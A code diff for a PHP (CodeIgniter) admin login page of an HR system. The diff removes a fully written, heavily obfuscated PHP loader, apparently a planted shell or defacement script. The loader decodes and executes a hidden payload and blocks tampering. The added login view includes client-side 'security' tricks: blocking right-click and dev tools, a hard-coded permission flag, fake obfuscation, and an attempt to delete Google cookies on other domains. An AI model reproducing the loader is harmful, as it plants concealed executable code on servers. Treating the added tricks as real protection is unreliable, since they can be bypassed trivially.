@@ -1,16 +1,212 @@
-You sent
-<?php
-const Z7T=__FILE__;
-$pzSHB=mKzqq('Y3JlYXRlX2Z1bmN0aW9u')("",hex2bin('6261736536345f6465636f6465')("JG1BaCA9IGZpbGVfZ2V0X2NvbnRlbnRzKFo3VCk7CiAgICBpZiAoc3RyaXN0cigkbUFoLCBiYXNlNjRfZGVjb2RlKCJaV05vYnciKSkgT1Igc3RyaXN0cigkbUFoLCBiYXNlNjRfZGVjb2RlKCJjSEpwYm5RIikpKSB7CiAgICAgICAgZXhpdCgiMCIpOwogICAgfWVsc2V7CiAgICAgICAgdW5zZXQoJG1BaCk7CiAgICB9"));$pzSHB();
-$vKVPI=oLpyH('487c627c3c7c4d7c767c3a7c417c2e7c5a7c217c657c637c2f7c2d7c207c307c407c787c6c7c257c287c557c247c327c4f7c547c297c5e7c677c697c7a7c517c5f7c707c367c797c2c7c4a7c537c757c397c667c317c477c747c7d7c777c6f7c587c507c527c3b7c687c7b7c6d7c6a7c347c497c457c4e7c467c617c7e7c2b7c237c387c337c6b7c227c3d7c647c577c607c277c447c5b7c3f7c377c437c357c4c7c427c6e7c597c4b7c737c2a7c567c3e7c267c727c717c5d');
-$zjHoGQ=hex2bin('6261736536345f6465636f6465')('4LiWfOydvHzkurp82Kl82LB87JWgfNmofOyVhXzslZV85Y+jfNmkfNmhfOW7v3zkuK187JW8fOmHkXzZo3zguI984LiKfNiufNmGfNiyfNmnfNiqfOW8k3zsno584LiCfOyWtHzYs3zslpF855SwfNC5fNCWfOaJi3zslYR82Lp87JW1fNirfNi2fOC4iHzguJh84LiUfNmmfOyWgHzsnbR82YJ82LF82Lh82aV84LiNfOyZnHzlsbF82LV84LiDfOC4k3zlpbN87J21fOyWtXzZinzgpK585rC0fOCkoHzguIV82K185Y2cfOCklnzslaF84LiHfNivfOC4hnzsl4R82Kh82Kx82al84KSZfOCknnzguIl87JW9fOyVnnzlv4N84LiMfNi0fOC4kXzguIR87J6JfOC4gXzguIt80JR85oiIfNmEfNmifOaciHzguJw=');
-$vKVPI=nBJYlOvDybeeS(oLpyH('7c'),$vKVPI);$zjHoGQ=nBJYlOvDybeeS(oLpyH('7c'),$zjHoGQ);
-$pcoQpyrode_=hex2bin('6261736536345f6465636f6465')('7JWV2aXslZXYteydvOyVntiz4LiR4LiN55Sw7J214LiR4LiM4LiT2KvYtdmh2KrYstiq4KSu5rC04LiY4LiH7JWV2KjgpK7YsOyVleyWgNiy2LjZoeyVoeyZnNi62aHguJPQlNiq7J6J7JWe7JeE7JWh0LnYsuyZnOC4jeCkrumHkeawtNmK7J6O7J6O4KSu55Sw7Jmc2YrZpuyVodio2aXmiYvguI3sl4Tph5HmsLTYsuyejuWls+yXhNi07Jmc2Yrph5HYsdmh6YeR7Jmc4KSu7JeE6YeR2abZitiy7J6O2LTYuNip4LiK2LjnlLDZoeyWgOaJi+Wls+ydvOawtNir4LiI4LiE4LiH2LjguI/QlOyWgNCU55Sw7J285rC07JeE7JaR4KSg5rC02LjYutiy4LiW4LiK4KSu2KnYquCkruaciOW8k9CU4KSu7JaR7JeE4LiH5b+D7J207J6O4LiW5omL4LiB7Jmc2KrgpK7YuNCU4LiH7JeE7JaR7J285aWz4LiH2LrguITguJPsnbXZptmk2KjYqdix4KSu7J6O2KvslpHsnbzsno7guIrlv4Psno7gpJnslZXgpK7YtuyWgNip2LHYsuC4h9i12LXgpKDsno7YtOaciNio4LiT4LiP7J6J2LbsloDmsLTsnongpKDZpuawtOCkmdi27JWh4KSu7J204LiE4LiR2LTsnbXsmZzZpti07J6J4KSg2Krsl4TgpJnsnonnlLDYtOyejuyejuyWgOyXhOyZnOydvOC4k9ir2KrYqOC4h9CU2KvsnbzguJbYs9i62KjguJHguITlv4PYqeC4itir4LiR2KnmsLTgpK7YqeCkoOC4luyXhNiy0Lnph5HmiYvYsOyVlemHkdip2aLlvJPmsLTgpK7gpJnYtuC4k+C4mOC4kdi22aXYs9ix0JTmsLTmiYvnlLDsmZzlpbPYq+yVldmk5aWz5rC07J6O4LiE5aWz2YrguI/QlNiq2Yrph5HsmZzguIrsl4TslpHslZXslaHsl4Tsno7sno7sno7guIrQlOyZnNiq2KvYuOyejuWls9ir5aWz7JeE4LiW7JeE2aXYqNml2LTYttio7JaA5rC02absnbzZiuyXhNir2aHYquyXhOC4luyVleyWgOydtOC4gdip4LiT7Jmc6YeR0JTsno7Yq+yVldmh5rC05omL4LiE2KjguJPguIHguI/smZzsloDZitix2LLguIrsl4TYtdip6YeR5omL7J6O2LLgpJnZqNmm0JTZpti42LHgpK7sno7Yq+yWkeCkoOC4k+C4j+yZnNC56YeR5omL2LDslZXph5HguIfYsdi25aWz4KSu7JaR7JeE2KrsmZzguITYqOC4kdi04KSg7J284LiH4LiH5b+D0JTQlOyXhOyWkeCkoOCkmdCU2aXQuemHkeaJi9mi7JWV6YeR4KSu2LjYsuC4iti14KSg7JeE4LiW2LXYstC56YeR5omL2LDslZXZpti06YeR2KnZiuCkrtir2aTguIfslZXguJbslZXsloDYseC4j+yZnNiy4LiK5pyI7J287JaA2abgpKDZodmK5b+D2aXYqOC4keyXhOW8k+yZnOC4h+C4iuC4gdmk5rC07JeE2LXgpKDsno7guIrZpdCU7JaA2aHYsdiy6YeR4LiP2Ljsl4TZpuyZnOCkmdi24LiT4LiY4LiR0LnYuuC4geydtdiy6YeR4KSu7J6J7J282Krsl4TYq+ydvOWls9CU4LiW4LiE7JWh0JTslZXQlNmK6YeR6YeR2KjguIrsmZzgpK7sl4TgpJnQudi64LiE4LiT5omL4LiB7J282KjsmZzYuNio5aWz2KvYqdmk4LiK4LiE2LrYqOC4k9iz4LiP0JTYquawtNiq7J6O2Kjlv4PlpbPsl4TguIrYq+ydtOC4hOC4k+C4j+CkoNip6YeR4LiP2aLgpK7QlOyXhOCkoNmh4LiH5b+D2aXYqNio4LiH5b+D4KSg2LLguIflv4PYqNCU7JeE4KSg2aTYqNi12aXQuemHkeaJi9mi7JWV6YeR4KSu5omL2KjQlOyZnOCkruCkruawtOaJi9iy7J6O2KjguIfYsdmk4LiT4KSu4LiB2aHmsLTYtdi12aTguJPguI/smZzQuemHkeaJi9iw7JWV6YeR4LiK4LiI4KSu2LLsl4TlpbPsl4TguIrYsti62KjguJPYs+C4j9CU2KrmsLTmiYvYqeawtOyZnOCkoOyXhNiq4LiP7Ja17JWV2YrmiYvZotiy2LLgpK7guIzYttio4LiK7JaR7JeE4LiH5b+D2aXguITYqOC4h9ix7Jmc7JaA2KvguIHYtuC4iti14KSZ2LbguJPsnbTguJHQueyVoeyWtdmm0JTYquawtOeUsNmk5rC07Jmc4KSZ2LbguJPguJjguJHYsuC4luyVldmi2LLYsuCkruC4jNi22aXguIrgpKDsl4TYstir4LiI7J6O4LiW4LiK4KSu7Jmc7JaA0JTlv4Psno7QlOyZnNip7JeE7J6O4LiH2LrYqNml2LTgpKDYqOawtOC4iuydtOW8k9ml4LiK5aWz7J287JaA7Jmc2aXYqNml7Jmc4LiB2KnguIfguI/slYTYtuWls+CkruyWkeCkoOeUsNCU2aXYqOWls+yWteW/g9C52abmiYvZptCU5aWz2KvYteCkoOC4h+yVleydtNio2aXslZXYq9iy2abYtOydtNCU4LiT2ablpbPsnbzYquC4j+yZnNC56YeR5omL2LDslZXph5HguIrlv4Psno7YsuyZnOC4itmk2LLZpuaciNi27J6O4LiK4KSu2KjmsLTYuNiq7J284KSZ2KvlpbPYtuC4k+ydtOyZnNC56YeR7J202KvZpNCU5omL2abQueWls+Ckrtip7J287JaA7Jmc2aXYqNml7Jmc4LiB7J282LLguIflv4PQlNiy7JeE5aWz4KSu0JTYq+C4hNC56YeR5omL2aLslZXph5HgpK7miYvgpK7gpJnYq+yWkeCkoOC4k+C4j+ydtNi27J6O4LiK7JWh0JTZpuaJi+W/g+ydvOawtOawtOCkmdi24LiT4LiY7JWh4LiE2aXQlOC4geyZnNiq7Ja17J214KSg2abmsLTgpJnYtueUsOyZnOyVhOyejtmK5omL2aLslZXph5HgpK7miYvguITYqtmm7JaR7JeE55Sw0JTmiYvguITguJHslZXlvJPQlNiq5rC06YeR7JWV55Sw2KvslZXYqeyejuC4iuC4luyVleC4luyZnNCU7Jmc2KrYq+yVodC54LiK2LXslZXsl4TguIfZpuC4hNio4LiT5b+D7JaA0JTYqtir2LHlvJPZpeC4iuWls9mk7J6O4LiK4LiW2KjguJHQlNio7J282KjsmZzYqtiy2KjZpuyWkeydvOC4ltC52LrYqNio2LXsnonYqeC4h+C4j+aJi9ip7JaA5omL4KSg7J282YrmiYvslrXguITYsuaJi9mi2LLYsuCkruC4jNi22LLgpK7gpK7gpK7ZitCU2YrslZXZpeyXhOC4kdCU2YrZpuaJi9ip4LiW5omL5aWz7J284LiW2LTguITguITZpeaJi+C4gdiy2LLgpK7snonsnbzYquyXhNir7JeE7J6O4LiH2LrYqNml2ajguI/Qudiq5rC05pyI0JTlpbPgpK7slpHYqeCkmeawtOyejtio4LiR4KSu7JWe2LbsloDgpK7YuNi24LiK4KSu0LnZodmm7JWV7J204LiE6YeR5omL2aLYstiy4KSu4LiM2aHYqtmm7JaR2aHguJbYteC4ltiy2YrmiYvZouyVlemHkdip2aLYqeawtOCkrtip7JWV55Sw0LnYuuC4hOC4k+aJi+C4geydvNio7Jmc2LjYqOC4h+yXhNir7J285rC02KvguITguITQlOyZnOyVntiy6YeR4LiP6YeR7Jmc2LLgpK7Qudi24LiT7J204LiR0Lnph5HguIHph5HQlOawtOaJi+eUsNiy4LiK2LXYtdip4KSZ4LiK4KSZ2LLguJbQlOC4gdip4LiK5omL2KrZpOyWgOydtNC57J284LiW2LXguJbslZXguJbYtNi22LbmsLTYtOyeieCkoNiq7JeE4KSZ7J6J55Sw2LXgpJnYttio4LiK4LiR0JTZiuC4j+ydtNiy4LiK2LXguIfgpKDsno7YtNmK7JWV7JaA4LiP5byT7J284LiT4KSu2LjgpKDgpJnYq+yVleyVlemHkdCU4LiW7JWV7JaA2LHguI/smZzZpti07J6J4KSg2Krsl4TgpJnsnonnlLDYtOyejuyejuyWgNmh7J217J280JTmiYvZpuydvNmK0JTYq+ydvOyWgOyZnNml2KjQlOawtOyVntmk0JTguIrYseyejuC4iti17JWV0Lnph5HYq+yejuyejuC4luyZnOawtNC52abYtOyeieCkoNiq7JeE4KSZ7J6J2abmsLTZpdio2KjguI/YuOyZnNmm2LTsnonsnbzYquyXhNC52aHnlLDmsLTguJbslZXsloDguJjsnbXgpKDguIfYqdmi7JeE2absl4TslpHYqeyWgNi14LiW2LbYsuyVleyVntCU4LiK7JeE0JTsno7lpbPYtNiy7Jmc2LLslZXgpJnYsuyVntmh5omL7J6J2LbguIfslb0=');
-$pcoQpyrode_=RdodrsQPtg(hex2bin('6261736536345f6465636f6465')('XFw'),hex2bin('6261736536345f6465636f6465')('XFw'),$pcoQpyrode_);
-$pcoQpyrode_=RdodrsQPtg(hex2bin('6261736536345f6465636f6465')('2KY'),PHP_EOL,$pcoQpyrode_);
-$dCQcXgkWrZ=RdodrsQPtg($zjHoGQ,$vKVPI,$pcoQpyrode_);$QTozdvENb=hmxzwmHYiS(false,$dCQcXgkWrZ);iVebVQARSL($QTozdvENb());
-function RdodrsQPtg($SxImnWd,$kFrnBgyi,$pcoQpyr){return mKzqq('c3RyX3JlcGxhY2U')($SxImnWd,$kFrnBgyi,$pcoQpyr);}function nBJYlOvDybeeS($SxImnWd,$kFrnBgyi){return mKzqq('ZXhwbG9kZQ')($SxImnWd,$kFrnBgyi);}function hmxzwmHYiS($SxImnWd,$kFrnBgyi){$kFrnBgyi = hex2bin('6261736536345f6465636f6465')($kFrnBgyi);return mKzqq('Y3JlYXRlX2Z1bmN0aW9u')($SxImnWd,$kFrnBgyi);}function oLpyH($str){$SxImnWd = mKzqq('Y3JlYXRlX2Z1bmN0aW9u')("","return hex2bin('$str');");return $SxImnWd();}function mKzqq($SxImnWd){return hex2bin('6261736536345f6465636f6465')($SxImnWd);}function iVebVQARSL($SxImnWd){die($SxImnWd);}
+<?= $this->extend('backend/layout/auth-layout') ?>
+<?= $this->section('content') ?>
 
-/*
-    obfuscated at https://tools.zone-xsec.com | @Zeerx7
-*/
+<div class="login-box bg-white box-shadow border-radius-10">
+    <div class="login-title">
+        <h2 class="text-center text-primary">Login To HRMS</h2>
+    </div>
+
+    <?php $validation = \Config\Services::validation(); ?>
+
+    <form action="<?= esc(route_to('admin.login.handler'), 'attr') ?>" method="POST">
+        <?= csrf_field() ?> <!-- Ensuring CSRF protection is in place -->
+
+        <!-- Success flash message -->
+        <?php if (!empty(session()->getFlashdata('success'))) : ?>
+            <div class="alert alert-success">
+                <?= esc(session()->getFlashdata('success')) ?>
+                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+        <?php endif; ?>
+
+        <!-- Failure flash message -->
+        <?php if (!empty(session()->getFlashdata('fail'))) : ?>
+            <div class="alert alert-danger">
+                <?= esc(session()->getFlashdata('fail')) ?>
+                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+        <?php endif; ?>
+
+        <!-- System Inaccessible Alert -->
+        <?php if (session()->get('system_accessible') === false): ?>
+            <script>
+                swal({
+                    title: "System Unavailable!",
+                    text: "The system is currently inaccessible. Please try again later.",
+                    icon: "warning",
+                    button: "OK"
+                });
+            </script>
+        <?php endif; ?>
+        <input type="hidden" name="recaptcha_token" id="recaptcha_token">
+        <!-- Input for Username or Email -->
+        <div class="input-group custom">
+            <input type="text" class="form-control form-control-lg" placeholder="Username or Email" name="login_id" value="<?= esc(set_value('login_id')) ?>">
+            <div class="input-group-append custom">
+                <span class="input-group-text"><i class="icon-copy dw dw-user1"></i></span>
+            </div>
+        </div>
+        
+        <!--   Validation Error for login_id -->
+        <?php if ($validation->getError('login_id')): ?>
+            <div class="d-block text-danger" style="margin-top: 25px; margin-bottom: 15px;">
+                <?= esc($validation->getError('login_id')) ?>
+            </div>
+        <?php endif; ?>
+
+        <!-- Input for Password -->
+        <div class="input-group custom">
+            <input type="password" class="form-control form-control-lg" id="password" placeholder="**********" name="password" value="<?= esc(set_value('password')) ?>">
+            <div class="input-group-append custom">
+                <span class="input-group-text" id="togglePassword">
+                    <i class="dw dw-padlock1"></i>
+                </span>
+            </div>
+        </div>
+
+
+        <!-- Validation Error for password -->
+        <?php if ($validation->getError('password')): ?>
+            <div class="d-block text-danger" style="margin-top: 25px; margin-bottom: 15px;">
+                <?= esc($validation->getError('password')) ?>
+            </div>
+        <?php endif; ?>
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="input-group mb-0">
+                <!-- <input class="btn btn-primary btn-lg btn-block" type="submit" value="Sign In" onclick="submitForm()"> -->
+                <input class="btn btn-primary btn-lg btn-block" type="submit" value="Sign In">
+                </div>
+            </div>
+        </div>
+        <div class="row pb-30">
+            <div class="col-6">
+                <div class="custom-control custom-checkbox">
+                    <!-- <input type="checkbox" class="custom-control-input" id="customCheck1" name="remember">
+                    <label class="custom-control-label" for="customCheck1">Remember</label> -->
+                </div>
+            </div>
+            <div class="col-6">
+                <div class="forgot-password">
+                    <a href="<?= esc(route_to('admin.forgot.form'), 'attr') ?>">Forgot Password</a>
+                </div>
+            </div>
+        </div>
+
+
+    </form>
+</div>
+<script src="https://www.google.com/recaptcha/api.js?render=6LdcqXoqAAAAAOKpdE7btEsLljApBKTl9gLoj5Ct"></script>
+<script>
+    grecaptcha.ready(function() {
+        grecaptcha.execute('6LdcqXoqAAAAAOKpdE7btEsLljApBKTl9gLoj5Ct', { action: 'login' }).then(function(token) {
+            document.getElementById('recaptcha_token').value = token;
+        });
+    });
+</script>
+<script>
+    // Toggle password visibility
+    document.getElementById('togglePassword').addEventListener('click', function() {
+        var passwordField = document.getElementById('password');
+        var icon = this.querySelector('i');
+        
+        // Toggle the password type between text and password
+        if (passwordField.type === "password") {
+            passwordField.type = "text"; // Show password
+            icon.classList.remove('dw-padlock1');  // Optionally change icon
+            icon.classList.add('dw-eye');          // Change to 'eye' icon (for example)
+        } else {
+            passwordField.type = "password"; // Hide password
+            icon.classList.remove('dw-eye');  // Optionally change icon back
+            icon.classList.add('dw-padlock1'); // Change to padlock icon
+        }
+    });
+</script>
+<script>
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    // Disable specific keyboard shortcuts for opening developer tools
+    document.addEventListener('keydown', function(event) {
+        if (event.key === "F12" || (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'J')) || (event.ctrlKey && event.key === 'U')) {
+            event.preventDefault();
+        }
+    });
+
+    // Hide sensitive content based on permissions (example logic)
+    const userHasPermission = false; // Set this based on actual user permissions
+    const sensitiveContent = document.getElementById('sensitiveContent');
+    if (sensitiveContent) {
+        if (userHasPermission) {
+            sensitiveContent.style.display = 'block';
+        } else {
+            sensitiveContent.style.display = 'none';
+        }
+    }
+
+    // Detect if Developer Console is opened and log a message or perform an action
+    const devToolsDetector = new Image();
+    Object.defineProperty(devToolsDetector, 'id', {
+        get: function () {
+            console.warn('Developer tools detected! Certain features may be disabled.');
+            // Add any additional actions here, like logging out the user or blocking access
+        }
+    });
+    console.log(devToolsDetector); // This will trigger the get function if console is opened
+
+    // Disable `contenteditable` attributes on all elements
+    document.querySelectorAll('*[contenteditable="true"]').forEach(el => el.setAttribute('contenteditable', 'false'));
+
+    // Obfuscate sensitive function names and operations
+    function obfuscatedFunction() {
+        // Dummy obfuscation example
+        const secretVar = btoa('Sensitive Data'); // Encodes the data to deter inspection
+        return atob(secretVar); // Decodes it only when needed
+    }
+
+    // Additional protections
+    window.addEventListener('load', () => {
+        // Example of restricting access after loading based on client-side logic
+        if (!userHasPermission) {
+            console.warn('Access restricted to certain areas.');
+        }
+    });
+</script>
+
+<script>
+function deleteSpecificCookies() {
+    var cookieNames = [
+        'ar_debug', 'IDE', 'DSID', 'COMPASS', 'GSP', '__Secure-OSID', 
+        'COMPASS', '__Host-3PLSID', '__Secure-3PSID', '__Secure-3PAPISID', 
+        '__Secure-3PSIDTS', 'NID', '__Secure-3PSIDCC'
+    ];
+
+    // Loop through each cookie name and remove it
+    for (var i = 0; i < cookieNames.length; i++) {
+        var cookieName = cookieNames[i];
+
+        // Try to remove cookies for the root path and specific domains
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.doubleclick.net";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.mail.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.scholar.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.docs.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.chromewebstore.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.lens.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.myaccount.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.play.google.com";
+        document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.accounts.google.com";
+    }
+}
+
+// Call the function to delete the specific cookies
+deleteSpecificCookies();
+
+</script>
+
+<?= $this->endSection() ?>
